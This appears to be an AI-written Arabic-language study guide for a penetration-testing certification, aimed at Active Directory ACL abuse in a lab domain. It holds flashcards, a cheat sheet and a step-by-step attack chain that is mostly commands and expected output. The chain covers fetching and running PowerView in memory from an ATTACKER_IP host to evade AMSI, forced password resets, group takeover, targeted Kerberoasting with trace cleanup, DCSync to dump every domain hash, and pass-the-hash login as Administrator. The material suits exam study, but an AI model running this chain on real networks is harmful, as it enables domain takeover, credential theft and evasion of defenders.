+"الـ Active Directory مو مثل الويب (Web). بالويب تدور على ثغرة برمجية (SQLi, XSS). بالـ AD أنت تدور على ميزة (Feature) مصممة بشكل خاطئ. الـ BloodHound هو صديقك الصدوق، استخرجه كأول خطوة دائماً. 80% من هجمات الـ AD الحديثة مبنية على الـ ACL Abuse."
+
+━━━━━
+
+💎 الفلاشكاردز — ملخص سريع للحفظ
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #1
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو الفرق بين ACL و ACE؟
+
+✅ Back: الـ ACL هي القائمة الكاملة للصلاحيات المربوطة بـ Object. الـ ACE هو سطر واحد داخل هاي القائمة (مثلاً: يوزر X مسموح له يقرأ).
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #2
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو الفرق بين GenericAll و GenericWrite؟
+
+✅ Back: GenericAll = Full Control (تحكم كامل، مسح، تغيير باسورد). GenericWrite = تحديث/تعديل خصائص (Attributes) معينة لليوزر/الجروب.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #3
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو الـ flag الأهم بـ PowerView حتى تترجم الصلاحيات المعقدة؟
+
+✅ Back: -ResolveGUIDs (يغير الـ GUIDs إلى أسماء مقروءة للبشر مثل User-Force-Change-Password).
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #4
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شلون تستخرج الـ ACLs ليوزر معين (بالاعتماد على الـ SID)؟
+
+✅ Back: Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #5
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو هو الـ GUID لصلاحية Force Change Password؟
+
+✅ Back: 00299570-246d-11d0-a768-00aa006e0529
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #6
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: إذا كنت ببيئة Linux وما تكدر تستخدم PowerView، شنو البديل الأقوى؟
+
+✅ Back: استخدام bloodhound-python لاستخراج كل الداتا لملفات JSON، أو استخدام dacledit.py من Impacket للتلاعب بالـ ACL.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #7
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو خطورة صلاحية Self-Membership على جروب؟
+
+✅ Back: تسمح لليوزر اللي يملكها أن يضيف نفسه كعضو داخل هذا الجروب بدون أي موافقات إضافية.
+
+━━━━━
+
+📄 ورقة الغش (Cheat Sheet) — للسكرين شوت
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📄 المخلص النهائي (AD ACL Enumeration Cheat Sheet)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚔️ خوارزمية الهجوم (ACL Abuse):
+
+١. استخدم PowerView أو BloodHound لجمع الـ ACLs.
+
+٢. ابحث عن صلاحيات خطيرة (GenericAll, GenericWrite, WriteDACL, Self-Membership, User-Force-Change-Password).
+
+٣. حدد الـ "فاعل" (من يملك الـ SID) والـ "مفعول به" (الـ ObjectDN الهدف).
+
+٤. إذا كان الفاعل هو اليوزر اللي إحنا مخترقيه، نفذ الهجوم (تغيير باسورد، إضافة للجروب).
+
+٥. كرر العملية (Pivot) بالصلاحيات الجديدة للوصول للـ Domain Admin.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📐 جدول الأوامر الأساسية:
+
+|**المجال**|**الهدف**|**الأمر**|
+|---|---|---|
+|Setup|تشغيل PowerView|`Set-ExecutionPolicy Bypass -Scope Process; Import-Module .\PowerView.ps1`|
+|Utils|تحويل اسم إلى SID|`Convert-NameToSid username`|
+|Utils|تحويل SID إلى اسم|`Convert-SidToName S-1-5-21-X-Y-Z`|
+|ACL Enum|جلب ACL لكائن محدد|`Get-DomainObjectACL -ResolveGUIDs -Identity "TargetName"`|
+|ACL Enum|جلب ACLs يملكها يوزر معين|`Get-DomainObjectACL -ResolveGUIDs -Identity * \| Where-Object {$_.SecurityIdentifier -eq $SID}`|
+|Raw AD|جلب GUID لصلاحية (بدون أدوات)|`Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties *`|
+|Linux Enum|تجميع BloodHound من Linux|`python3 bloodhound.py -d domain.local -u user -p pass -ns DC_IP -c All`|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔢 أخطر أنواع الـ AD Rights (ObjectAceType / ActiveDirectoryRights):
+
+|**الصلاحية**|**معناها**|**الاستغلال المحتمل**|
+|---|---|---|
+|`GenericAll`|تحكم كامل (Full Control)|تغيير الباسورد، مسح الكائن، إضافة للجروب|
+|`GenericWrite`|تعديل الخصائص (Attributes)|تعديل الـ Logon Script، تغيير الـ SPN|
+|`WriteDACL`|تعديل الـ ACL نفسها|منح نفسك `GenericAll` على الهدف|
+|`WriteOwner`|تغيير مالك الـ Object|جعل نفسك المالك ثم تغيير الـ ACL|
+|`User-Force-Change-Password`|تغيير الباسورد (بدون القديم)|أخذ حساب الهدف فوراً (Takeover)|
+|`Self-Membership`|انضمام ذاتي لجروب|إدخال نفسك في جروب مهم للوراثة|
+|`DS-Replication-Get-Changes`|صلاحية مزامنة الـ AD|استخدام DCSync لسرقة כל الهاشات!|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🚨 الفخوخ (لا تنساها):
+
+❌ نسيان `-ResolveGUIDs` بـ PowerView والضياع بين الأرقام.
+
+❌ الخلط بين `ObjectDN` (الضحية) و `SecurityIdentifier` (المهاجم اللي عنده الصلاحية).
+
+❌ استخدام `Get-DomainObjectACL -Identity *` ببيئة حقيقية ضخمة (راح يفجر الـ Memory والـ Logs).
+
+❌ تجاهل الـ Nested Groups (جروب داخل جروب). دائماً افحص أعضاء الجروب اللي تستهدفه والجروبات اللي ينتمي إلها هذا الجروب.
+
+━━━━━
+
+🎯 رسالة الختام:
+
+بهيج خلصنا. هسة عندك:
+
+✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة)
+
+✅ كل المصطلحات (ACL, ACE, GUID, SID, PowerView...)
+
+✅ كيفية التفكير (decision trees لاستخراج وتتبع الصلاحيات)
+
+✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر للإجابة على الأسئلة الخمسة)
+
+✅ الـ bypasses والـ variations والفخوخ (AMSI, BloodHound.py)
+
+✅ فلاشكاردز (للمراجعة السريعة)
+
+✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)
+
+راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪
+
+
+
+تمام! استلمت التكملة العظيمة والسيناريوهات المتقدمة (What-If Masterclass). هذا الجزء هو زبدة امتحان الـ CPTS والسيناريوهات الحقيقية اللي تواجهك بالشركات. خلني أشرحلك هاي التكتيكات والهجمات المتقدمة (مثل DCSync و AMSI Bypass) من الألف للياء، وبنفس الهيكلية الشاملة:
+
+🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش
+
+يله نبدأ رحلة السيطرة الكاملة على الدومين... 🚀
+
+━━━━━
+
+🟢 المرحلة 0: ما قبل الصفر — Big Picture
+
+تخيل إنك دخلت بناية ضخمة (الـ Active Directory) ولقيت ورقة (ACL) مكتوب بيها إنك تكدر تفتح باب غرفة "مدراء النظام". بالسابق، فحصنا الأبواب وعرفنا صلاحياتنا. بس هسة السؤال: شلون نفتح الباب بدون ما ندق جرس الإنذار؟ وشلون نستغل هاي الصلاحية بأذكى طريقة؟
+
+الشركات الكبيرة ما تستخدم إعدادات بسيطة، وعدهم حراس أمن (مثل Windows Defender و AMSI) يراقبون كل حركة تسويها بالـ PowerShell. إذا تفتح أداة مثل PowerView وتنفذ أوامر عشوائية تبحث بكل الدومين، الحارس راح يمسكك فوراً ويطردك (AMSI Block)، أو العملية راح تاخذ ساعات والسيرفر يعلّق. لذلك، بهذي المرحلة نتعلم "التعداد الموجه" (Targeted Enumeration) — يعني بدل ما تفتش البناية كلها، تروح مباشرة للغرفة اللي تشك بيها.
+
+الموضوع الثاني والأهم هو "الاستغلال الصامت" (Stealth Exploitation). تخيل يوزر عنده صلاحية `GenericAll` (تحكم كامل) على يوزر ثاني. الطريقة المزعجة (Noisy) هي إنك تغير باسورده. بس من تغير باسورده، اليوزر الأصلي ما راح يكدر يدخل لدوامه الصبح، وراح يخابر قسم الـ IT، وينكشف الهجوم!
+
+لعد شنو الحل؟ الحل هو نستخدم حيل ذكية مثل "Targeted Kerberoasting" أو "ASREPRoasting". بهذي الحيل، إحنا نعدل خصائص اليوزر بالخفاء، نخليه يعطينا الـ Hash مالته، ونروح نكسره بحاسبتنا (ببيئة Parrot OS أو غيرها) بدون ما أحد يحس.
+
+أما الـ "Endgame" أو الضربة القاضية بالـ Active Directory فهي هجوم الـ DCSync.
+
+تخيل أن الـ Domain Controllers (السيرفرات الرئيسية) بالشركة تحتاج تحجي ويه بعضها وتتزامن (Replication) حتى تنقل الباسوردات الجديدة. هذا التزامن يحتاج صلاحيات خاصة جداً (`DS-Replication-Get-Changes`). إذا أنت، كمهاجم، كدرت تسرق يوزر عنده هاي الصلاحيات... تكدر توكف بنص الشبكة وتصيح للسيرفر: "يا سيرفر، أني دومين كونترولر جديد، انطيني كل الباسوردات والهاشات مال كل الموظفين، وأهمهم مدير الشبكة!". السيرفر راح يصدقك وينطيك كل شي. وبمجرد ما تحصل الهاش مال مدير الشبكة (Administrator)، اللعبة انتهت (Game Over)، وتكدر تسجل دخول كمدير وتسيطر على كل شيء.
+
+هاي المرحلة راح ترتب أفكارك، وتخليك تفكر مثل مختبر اختراق محترف (Red Teamer) يخطط لكل خطوة، ويعرف شلون يتخطى الحمايات، ويسجل كل خطوة بملفات الـ Markdown مالته حتى يرجع إلها وقت الحاجة.
+
+━━━━━
+
+🔵 المرحلة 1: المصطلحات
+
+حتى نفهم هاي الهجمات المعقدة، لازم نضبط مصطلحاتها. اقرأها بتركيز لأنها راح تتكرر بكل أدواتك:
+
+AMSI (Anti-Malware Scan Interface) (واجهة فحص البرمجيات الخبيثة)
+
+- شنو يعني؟ هو نظام حماية داخل الويندوز يشتغل مثل نقطة تفتيش لأي كود PowerShell أو VBScript قبل ما يتنفذ بالذاكرة. إذا شاف كود مشبوه (مثل كلمة PowerView)، يوكف التنفيذ فوراً.
+    
+- وين يظهر بالأدوات/الأوامر؟ يظهر كرسالة خطأ باللون الأحمر بالـ PowerShell تكول `script contains malicious content`. يحتاج Bypass.
+    
+
+Targeted Enumeration (التعداد الموجه)
+
+- شنو يعني؟ بدل ما تبحث بكل الـ Active Directory وتفحص آلاف اليوزرات، تحدد يوزر واحد أو جروب واحد وتفحص صلاحياته. هذا يوفر وقت، وما يخلي أجهزة المراقبة تصيدك.
+    
+- وين يظهر بالأدوات/الأوامر؟ نستخدم `-Identity "Username"` بدل `-Identity *` بأداة PowerView.
+    
+
+AS-REP Roasting (تحميص تذاكر المصادقة)
+
+- شنو يعني؟ بالوضع الطبيعي، من تريد تذكرة دخول (Ticket)، لازم تثبت هويتك أولاً (Pre-Authentication). بس مرات اكو يوزرات الإعدادات مالتهم تسمح بطلب التذكرة بدون إثبات هوية! المهاجم يطلب التذكرة، يستلمها (وبداخلها جزء مشفر بباسورد اليوزر)، ويروح يكسرها بـ Hashcat.
+    
+- وين يظهر بالأدوات/الأوامر؟ يظهر كخاصية `DONT_REQ_PREAUTH`، ونستغلها بأداة `GetNPUsers.py`.
+    
+
+Targeted Kerberoasting (التحميص الموجه)
+
+- شنو يعني؟ هجوم Kerberoasting العادي يعتمد على البحث عن يوزرات عدهم `SPN` جاهز. بس إذا إنت عندك صلاحية `GenericAll` على يوزر، إنت تكدر "تزرع" إله `SPN` وهمي بيدك! وبعدين تطلب تذكرته وتكسرها، بدون ما تغير باسورده وتكشف نفسك.
+    
+- وين يظهر بالأدوات/الأوامر؟ نستخدم `Set-DomainObject` لإضافة الـ SPN الوهمي `serviceprincipalname='fake/NOTHING'`.
+    
+
+DCSync (مزامنة متحكم المجال)
+
+- شنو يعني؟ هجوم يستغل ميزة مزامنة قواعد البيانات (Replication) بين سيرفرات الـ Active Directory. المهاجم ينتحل شخصية سيرفر، ويطلب بيانات اليوزرات (الهاشات) من السيرفر الحقيقي.
+    
+- وين يظهر بالأدوات/الأوامر؟ نحتاج صلاحيات `DS-Replication-Get-Changes`، وننفذ الهجوم بأداة `secretsdump.py` أو Mimikatz.
+    
+
+Shadow Credentials (بيانات الاعتماد المخفية/الظل)
+
+- شنو يعني؟ تقنية متقدمة جداً تشتغل إذا كان اكو خادم شهادات (ADCS) بالشبكة. بدل ما تغير باسورد اليوزر، تزرع "شهادة أمنية" (Certificate) مخفية بخصائصه (`msDS-KeyCredentialLink`). هذي الشهادة تسمحلك تدخل كأنك هو، والباسورد الأصلي يبقى شغال بدون تغيير.
+    
+
+krbtgt (حساب تذكرة كيربيروس)
+
+- شنو يعني؟ هذا يوزر مخفي وموجود بكل دومين، وهو الأهم على الإطلاق. الباسورد مال هذا اليوزر يُستخدم لتشفير كل التذاكر الذهبية (Golden Tickets). إذا حصلت الهاش مالته بعملية DCSync، تكدر تصنع تذاكر تخليك مدير للأبد، حتى لو غيروا باسورد المدير!
+    
+
+Pass-the-Hash / PTH (تمرير الـ Hash)
+
+- شنو يعني؟ بالويندوز، من تكتب باسوردك، النظام يحوله إلى صيغة رياضية (NTLM Hash) ويقارنه. هجوم الـ PTH يعني إنت ما تحتاج تعرف الباسورد الحقيقي المكتوب، بس تسرق الـ Hash وتمرره للنظام كأنه هو الباسورد.
+    
+- وين يظهر بالأدوات/الأوامر؟ نستخدمه بأدوات مثل `evil-winrm -H` أو `psexec.py -hashes`.
+    
+
+Nested Groups (الجروبات المتداخلة)
+
+- شنو يعني؟ جروب يكون عضو داخل جروب ثاني. مثلاً جروب "متابعة" عضو بجروب "المدراء". الصلاحيات تنتقل بالوراثة (Inheritance). اللي يسيطر على الصغير، يسيطر على الكبير تلقائياً.
+    
+
+━━━━━
+
+🟡 المرحلة 2: تحليل التحدي + كيف تفكر
+
+📖 ترجمة السيناريوهات:
+
+عدنا مجموعة تحديات متقدمة.
+
+أولاً: أداة PowerView تنحظر أو بطيئة جداً.
+
+ثانياً: عدنا صلاحية `GenericWrite` على جروب وما نعرف شنسوي بيها.
+
+ثالثاً: عدنا صلاحية `GenericAll` على يوزر ونريد نستغله بدون ما نثير الانتباه.
+
+رابعاً: وصلنا للـ Endgame وحصلنا صلاحيات الـ Replication، ونريد نسيطر على الدومين بالكامل.
+
+🎯 معطيات السيناريو:
+
+- اليوزرات المخترقة سابقاً: `wley` و `damundsen` و `forend`.
+    
+- الأهداف: `Help Desk Level 1` (جروب)، `dpayne` (يوزر)، والـ Domain Controller.
+    
+- القيود: برامج الحماية (AMSI) مفعلة، والبحث العشوائي `Identity *` ياخذ وقت طويل جداً وممكن ينحظر.
+    
+
+🧭 كيف تفكر؟ — Decision Trees حسب النوع:
+
+━━━ لتخطي الحماية والسرعة (AMSI & Speed) ━━━
+
+هل الأداة تنحظر أول ما تشغلها؟
+
+├── نعم، يعطي خطأ script contains malicious content
+
+│ ├── جرّب: AMSI Bypass (نحمل سكريبت يعطل الفحص بالذاكرة)
+
+│ ├── جرّب: تحميل PowerView من الذاكرة مباشرة (IEX DownloadString)
+
+│ └── جرّب: تحويل السكريبت إلى Base64 وتمريره كـ EncodedCommand
+
+└── لا، تشتغل بس تأخذ وقت طويل جداً (Identity _) └── جرّب: Targeted Enumeration — ابحث عن يوزر أو جروب محدد بالاسم بدل النجمة (_).
+
+━━━ لاستغلال صلاحية GenericWrite على جروب ━━━
+
+شنو تكدر تسوي؟
+
+├── هل إنت عضو بالجروب؟ لا.
+
+├── هل تكدر تضيف نفسك؟ نعم، الـ GenericWrite تسمح بتعديل الأعضاء.
+
+└── القرار: استخرج اليوزر اللي عندك عليه تحكم (damundsen)، غير باسورده، ادخل بيه، وضيف نفسك للجروب المطلوب.
+
+━━━ لاستغلال صلاحية GenericAll على يوزر ━━━
+
+تريد تخترق dpayne بصمت لو بإزعاج؟
+
+├── هجوم مزعج (Noisy): غيّر باسورده فوراً بـ Set-DomainUserPassword. (اليوزر راح يفقد دخوله).
+
+├── هجوم صامت ١ (Targeted Kerberoast): ازرع SPN وهمي، اطلب تذكرته، اكسر الهاش.
+
+├── هجوم صامت ٢ (AS-REP Roast): عطّل الـ Pre-Auth بحسابه، اطلب تذكرته، اكسر الهاش.
+
+└── هجوم صامت ٣ (Shadow Credentials): إذا اكو ADCS، ازرع شهادة وسجل دخول بيها.
+
+━━━ لهجوم DCSync (The Endgame) ━━━
+
+هل عندك صلاحيات DS-Replication-Get-Changes؟
+
+├── نعم!
+
+│ ├── استخدم `secretsdump.py` من الكالي (Parrot/Linux) لسحب الهاشات عبر الشبكة.
+
+│ ├── اسحب هاش الـ Administrator و هاش الـ krbtgt.
+
+│ └── نفذ Pass-the-Hash بـ `evil-winrm` للحصول على Shell كمدير.
+
+└── لا.
+
+└── استمر بالبحث بـ BloodHound عن مسار يوصلك لجروب عده هاي الصلاحيات (مثل Domain Admins أو Exchange Servers).
+
+🗺️ خريطة الهجوم (Roadmap):
+
+١. تخطي الـ AMSI واستخدام تقنية التعداد الموجه (Targeted Enum) لمعرفة صلاحيات `forend`.
+
+٢. استغلال صلاحيات `GenericWrite` لإضافة يوزرات لجروبات حساسة.
+
+٣. استغلال صلاحية `GenericAll` لتنفيذ Targeted Kerberoasting بهدوء.
+
+٤. الوصول ليوزر `adunn` واستخدام صلاحيات المزامنة لتنفيذ DCSync.
+
+٥. تسجيل الدخول كـ Administrator وإعلان السيطرة.
+
+━━━━━
+
+🟠 المرحلة 3: الاستغلال التفصيلي
+
+هنا نطبق الخطة خطوة بخطوة. ركز على التفاصيل لأن كل أمر إله سبب.
+
+الخطوة [1]: تخطي الحماية (AMSI Bypass) والاستيراد الآمن
+
+📌 ليش نسوي هاي الخطوة؟
+
+برنامج Windows Defender يقرأ محتوى ملف `PowerView.ps1` وراح يرفض تشغيله لأن الأداة معروفة كأداة اختراق (Signature-based detection). الحل الأسهل هو تشفير الكود وتمريره للذاكرة مباشرة، أو استخدام أوامر مخفية، بس هنا راح نستعرض طريقة جلب الكود من سيرفرنا (الكالي/Parrot) مباشرة للذاكرة.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# على جهاز المهاجم (Linux) نفتح سيرفر بسيط بمجلد الأدوات
+python3 -m http.server 80
+
+# على السيرفر الهدف (Windows) نطلب السكريبت ونشغله بالذاكرة باستخدام IEX
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `python3 -m http.server`: يفتح ويب سيرفر سريع.
+    
+- `IEX` (Invoke-Expression): ياخذ النص اللي يستلمه من الرابط وينفذه مباشرة ككود PowerShell بالذاكرة (In-Memory) بدون ما ينحفظ كملف على الهارد ديسك، مما يقلل فرصة كشفه من الـ Antivirus.
+    
+- `DownloadString`: تجلب النص البرمجي من رابط خارجي.
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+# لا يوجد output مرئي، لكن الأداة الآن محملة بالذاكرة وجاهزة للاستخدام.
+PS C:\>
+```
+
+━━━━━━━━━━━━━━
+
+الخطوة [2]: التعداد الموجه (Targeted Enumeration) للسرعة (Q4 & Q5)
+
+📌 ليش نسوي هاي الخطوة؟
+
+أمر `Identity *` ياخذ أكثر من ٥ دقائق بالشبكات الكبيرة وممكن يسوي Timeout. بما إنه إحنا مهتمين نعرف صلاحيات `forend` على أهداف محددة (مثل اليوزر `dpayne` والجروب `GPO Management`)، راح نسأل النظام عنهم بالاسم مباشرة.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# أولاً: نحول اسم المهاجم forend إلى SID حتى نبحث عنه بالنتائج
+$sid3 = Convert-NameToSid forend
+
+# ثانياً: نفحص اليوزر dpayne حصراً (لإجابة Q4)
+Get-DomainObjectACL -ResolveGUIDs -Identity "dpayne" | Where-Object {$_.SecurityIdentifier -eq $sid3}
+
+# ثالثاً: نفحص الجروب GPO Management حصراً (لإجابة Q5)
+Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | Where-Object {$_.SecurityIdentifier -eq $sid3}
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `-Identity "dpayne"`: يخلي الأداة تجلب الـ ACL الخاصة بـ dpayne فقط! هذا يخلي الأمر يتنفذ بأجزاء من الثانية.
+    
+- `-ResolveGUIDs`: ذكرناها، حتى نترجم الأرقام لكلمات مفهومة.
+    
+
+📤 الـ Output المتوقع (لليوزر dpayne):
+
+PowerShell
+
+```
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Dagmar Payne,OU=IT,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : GenericAll
+ObjectAceType          : All
+SecurityIdentifier     : S-1-5-21-XXX-XXX-XXX-1002
+```
+
+✅ النتيجة: عرفنا إن `forend` عنده `GenericAll` على `dpayne`.
+
+━━━━━━━━━━━━━━
+
+الخطوة [3]: استغلال GenericWrite على جروب (إضافة عضو)
+
+📌 ليش نسوي هاي الخطوة؟
+
+بالتحليل السابق، اكتشفنا إن اليوزر `damundsen` عنده `GenericWrite` على جروب `Help Desk Level 1`. هذي الصلاحية تسمح لنا نعدل خصائص الجروب، وأهم خاصية هي "قائمة الأعضاء". راح نضيف اليوزر المخترق للجروب حتى نورث (Inherit) كل صلاحيات الجروب.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# أولاً: نغير باسورد damundsen لأننا نملك ForceChangePassword عليه (من حساب wley)
+$newpass = ConvertTo-SecureString 'HackedPass@2026!' -AsPlainText -Force
+Set-DomainUserPassword -Identity damundsen -AccountPassword $newpass
+
+# ثانياً: نجهز كائن بيانات الدخول (Credential Object) لليوزر damundsen
+$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $newpass)
+
+# ثالثاً: نستخدم صلاحية GenericWrite لإضافة أنفسنا (damundsen) للجروب
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $cred
+
+# رابعاً: نتحقق من نجاح الإضافة
+Get-DomainGroupMember -Identity 'Help Desk Level 1'
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `Set-DomainUserPassword`: أداة لتغيير الباسورد مباشرة بدون معرفة القديم (لأن عدنا صلاحية).
+    
+- `PSCredential`: الويندوز يطلب منك إثبات هوية قبل ما تنفذ أمر بصلاحيات يوزر ثاني. هذا الأمر يدمج الاسم والباسورد بمتغير واحد.
+    
+- `Add-DomainGroupMember`: أداة لتعديل أعضاء الجروب، واستخدمنا `-Credential` حتى ننفذها باسم `damundsen` (صاحب الصلاحية).
+    
+
+📤 الـ Output المتوقع:
+
+PowerShell
+
+```
+# بعد أمر التحقق Get-DomainGroupMember، راح يظهر damundsen ضمن الأعضاء
+GroupDomain             : INLANEFREIGHT.LOCAL
+GroupName               : Help Desk Level 1
+MemberName              : damundsen
+MemberSID               : S-1-5-21-XXX-1105
+```
+
+━━━━━━━━━━━━━━
+
+الخطوة [4]: استغلال GenericAll بصمت (Targeted Kerberoasting)
+
+📌 ليش نسوي هاي الخطوة؟
+
+عدنا `GenericAll` على اليوزر `dpayne`. ما نريد نغير باسورده ونفضحه. راح نستخدم حيلة ذكية: نزرع إله خاصية `SPN` (واللي عادة تنعطي للسيرفرات فقط). هذا راح يخلي النظام يعتبر `dpayne` كأنه "خدمة"، وبالتالي نكدر نطلب تذكرته المشفرة (TGS) ونكسرها بـ Hashcat لمعرفة باسورده الأصلي.
+
+🔧 الأمر:
+
+PowerShell
+
+```
+# زرع SPN وهمي لليوزر dpayne
+Set-DomainObject -Identity dpayne -SET @{serviceprincipalname='fake/NOTHING'}
+
+# من جهاز الكالي (Linux)، نطلب التذكرة باستخدام أداة GetUserSPNs.py من Impacket
+python3 GetUserSPNs.py INLANEFREIGHT.LOCAL/forend:Password123 -dc-ip 10.10.10.10 -request -outputfile dpayne_hash.txt
+
+# تنظيف الـ SPN الوهمي (حتى ما ننكشف)
+Set-DomainObject -Identity dpayne -Clear serviceprincipalname
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `-SET @{serviceprincipalname='fake/NOTHING'}`: يعدل الـ Attribute الخاص بالـ SPN ويحطله أي اسم وهمي (مثل fake/NOTHING).
+    
+- `GetUserSPNs.py`: سكريبت بايثون يبحث عن أي يوزر بالدومين عنده SPN ويسحب التذكرة مالته (Ticket Granting Service - TGS) ويحفظها بملف.
+    
+- `-Clear`: خطوة احترافية جداً لمسح الأثر (OpSec).
+    
+
+📤 الـ Output المتوقع (للأداة باللينكس):
+
+Plaintext
+
+```
+ServicePrincipalName  Name    MemberOf                                            PasswordLastSet             LastLogon  Delegation 
+--------------------  ------  --------------------------------------------------  --------------------------  ---------  ----------
+fake/NOTHING          dpayne  CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2026-07-31 09:15:32         <never>    False
+
+[+] Saving tickets in dpayne_hash.txt
+```
+
+✅ الخطوة التالية: تاخذ ملف `dpayne_hash.txt` وتكسره بـ Hashcat (Mode 13100).
+
+━━━━━━━━━━━━━━
+
+الخطوة [5]: النهاية الحتمية (The Endgame) — DCSync Attack
+
+📌 ليش نسوي هاي الخطوة؟
+
+لنفترض أن مسار الصلاحيات (Attack Chain) وصلك لليوزر `adunn`. بالبحث العشوائي، اكتشفت أن `adunn` يمتلك صلاحيتين نادرة جداً ومخصصة للسيرفرات فقط:
+
+`DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-In-Filtered-Set`.
+
+هذه الصلاحيات تسمحلك تنفذ أخطر هجوم بالـ Active Directory: الـ DCSync. راح نطلب الهاش الخاص بالمدير (Administrator).
+
+🔧 الأمر:
+
+Bash
+
+```
+# ننفذ الهجوم من جهازنا اللينكس (Parrot/Kali) باستخدام secretsdump.py
+python3 secretsdump.py -just-dc-user Administrator INLANEFREIGHT.LOCAL/adunn:AdunnPass123!@10.10.10.200
+
+# أو سحب كل الهاشات لكل اليوزرات بالشركة!
+python3 secretsdump.py -outputfile all_hashes -just-dc INLANEFREIGHT.LOCAL/adunn:AdunnPass123!@10.10.10.200
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `secretsdump.py`: أداة مرعبة من Impacket، تتصل بالـ Domain Controller عن طريق بروتوكول MS-DRSR (الخاص بالتزامن) وتخدعه.
+    
+- `-just-dc-user Administrator`: يحدد إننا نريد فقط هاش يوزر محدد (حتى ما نسحب آلاف الهاشات ونسوي ضغط على الشبكة).
+    
+- `INLANEFREIGHT.LOCAL/adunn...`: بيانات دخول اليوزر اللي يملك صلاحية الـ Replication.
+    
+
+📤 الـ Output المتوقع:
+
+Plaintext
+
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1573966a64cc31cc:::
+```
+
+✅ الخطوة التالية: حصلنا الـ NTLM Hash للمدير `7796ee39fd3a9c3a1573966a64cc31cc`. ما نحتاج نكسره! نستخدم تقنية Pass-the-Hash للاتصال كمدير:
+
+Bash
+
+```
+evil-winrm -i 10.10.10.200 -u Administrator -H 7796ee39fd3a9c3a1573966a64cc31cc
+```
+
+مبروك! أنت الآن `NT AUTHORITY\SYSTEM` أو `Domain Admin`. اللعبة انتهت بالكامل.
+
+📊 لحد هسة:
+
+[x] تخطينا الـ AMSI وحملنا أدواتنا.
+
+[x] استخدمنا الـ Targeted Enum للسرعة والتخفي.
+
+[x] استغلينا GenericWrite لإضافة يوزرات لجروبات.
+
+[x] استغلينا GenericAll لزرع SPN وسحب هاشات بصمت.
+
+[x] وصلنا لـ Replication Rights ونفذنا DCSync!
+
+رسمة الـ Attack Chain الكاملة (من البداية للنهاية):
+
+Plaintext
+
+```
+[Attacker Setup]
+    │
+    ├─ 1. wley (Compromised initially)
+    │       │ [ForceChangePassword - GUID: 00299570...]
+    │       ▼
+    ├─ 2. damundsen
+    │       │ [GenericWrite]
+    │       ▼
+    ├─ 3. Help Desk Level 1 (Group)
+    │       │ [Nested inside]
+    │       ▼
+    ├─ 4. Information Technology (Group)
+    │       │ [GenericAll]
+    │       ▼
+    ├─ 5. adunn (User)
+    │       │ [DS-Replication-Get-Changes]
+    │       ▼
+    └─ 6. DCSync Attack via secretsdump.py
+            │
+            ▼
+        [DOMAIN CONTROLLER PWNED - ALL HASHES DUMPED]
+```
+
+━━━━━
+
